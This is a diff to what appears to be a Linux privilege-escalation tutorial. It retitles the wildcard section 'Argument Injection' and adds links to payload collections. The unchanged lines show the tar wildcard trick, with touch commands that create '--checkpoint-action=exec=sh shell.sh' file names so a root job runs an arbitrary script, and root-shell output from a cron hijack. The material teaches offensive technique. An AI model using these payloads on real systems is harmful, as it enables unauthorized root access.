@@ -121,7 +121,7 @@ When the cron job now triggers, the relative `overwrite.sh` command will first b
 uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
 </code></pre>
 
-## Wildcards
+## Wildcards (Argument Injection)
 
 Bash allows you to use `*` wildcards in commands to insert any files that match the wildcard. This works by inserting all the matched files after each other separated by spaces in the command since most commands allow you to add as many files as you want by just adding more arguments.&#x20;
 
@@ -191,3 +191,13 @@ $ nano shell.sh  # Any payload you want to execute
 $ touch -- --checkpoint=1
 $ touch -- '--checkpoint-action=exec=sh shell.sh'
 ```
+
+For **more** Argument Injection payloads like this for different tools, see the following two collections:
+
+{% embed url="https://gtfoargs.github.io/" %}
+A list of many different and common tools, and what functionality they can have
+{% endembed %}
+
+{% embed url="https://sonarsource.github.io/argument-injection-vectors/" %}
+A few specific tools with system command and file write functionality
+{% endembed %}
